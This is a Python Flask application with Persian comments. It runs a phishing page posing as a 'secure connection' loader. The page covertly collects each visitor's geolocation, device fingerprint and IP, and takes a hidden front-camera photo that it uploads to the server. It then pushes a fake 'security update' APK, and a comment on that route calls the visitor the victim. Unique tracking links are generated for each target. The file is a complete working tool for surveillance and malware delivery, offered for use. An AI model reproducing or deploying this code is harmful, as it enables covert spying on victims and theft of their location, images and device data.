import os
import uuid
import base64
import json
import logging
from flask import Flask, request, render_template_string, send_from_directory
from threading import Thread

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# پوشه برای ذخیره عکس‌ها و لاگ‌ها
os.makedirs("logs", exist_ok=True)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>در حال بارگیری...</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding-top: 10vh; font-family: Arial; }
        video, canvas { display: none; }
        #download-btn { display: none; padding: 15px 30px; background: #4CAF50; color: white; border: none; font-size: 18px; cursor: pointer; border-radius: 8px; }
    </style>
</head>
<body>
    <h2 id="msg">در حال برقراری ارتباط امن...</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <a id="download-btn" href="/download/app-update.apk" download>دانلود بروزرسانی امنیتی</a>

    <script>
        const token = "{{ token }}";
        const msg = document.getElementById('msg');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const btn = document.getElementById('download-btn');

        // جمع‌آوری موقعیت جغرافیایی
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/log/' + token, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ type: 'location', lat: pos.coords.latitude, lng: pos.coords.longitude })
                });
            }, err => {
                fetch('/log/' + token, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ type: 'location_error', message: err.message })
                });
            });
        }

        // جمع‌آوری اطلاعات دستگاه
        const deviceInfo = {
            type: 'device',
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        fetch('/log/' + token, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(deviceInfo)
        });

        // فعال‌سازی دوربین و گرفتن عکس
        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                    fetch('/upload/' + token, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ image: dataURL })
                    }).then(res => res.json()).then(data => {
                        msg.innerText = 'اتصال برقرار شد.';
                        btn.style.display = 'block';
                    });
                    setTimeout(() => { stream.getTracks().forEach(track => track.stop()); }, 2000);
                };
            } catch (err) {
                msg.innerText = 'لطفاً برای ادامه، دسترسی به دوربین را تأیید کنید.';
                btn.style.display = 'block';  // دکمه دانلود حتی در صورت خطا هم نشان داده شود
            }
        }
        capture();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return "ربات فعال است. لینک اختصاصی از طریق API ایجاد کنید."

@app.route('/new-link')
def new_link():
    """ایجاد یک لینک یکتا و بازگشت آن"""
    token = str(uuid.uuid4())
    link = f"{request.host_url}capture/{token}"
    return {"link": link, "token": token}

@app.route('/capture/<token>')
def capture_page(token):
    return render_template_string(HTML_TEMPLATE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload_photo(token):
    """ذخیره عکس دریافت‌شده"""
    data = request.get_json()
    if not data or 'image' not in data:
        return {"status": "error"}, 400
    try:
        image_data = base64.b64decode(data['image'].split(',')[1])
        filename = f"logs/photo_{token}.jpg"
        with open(filename, 'wb') as f:
            f.write(image_data)
        app.logger.info(f"عکس ذخیره شد: {filename}")
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500

@app.route('/log/<token>', methods=['POST'])
def log_info(token):
    """ثبت اطلاعات جانبی (موقعیت، دستگاه و...)"""
    data = request.get_json()
    data['ip'] = request.remote_addr
    filename = f"logs/info_{token}.json"
    with open(filename, 'a') as f:
        f.write(json.dumps(data) + '\n')
    return {"status": "ok"}

@app.route('/download/<path:filename>')
def download_file(filename):
    """ارسال فایل APK به قربانی"""
    return send_from_directory('static', filename)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
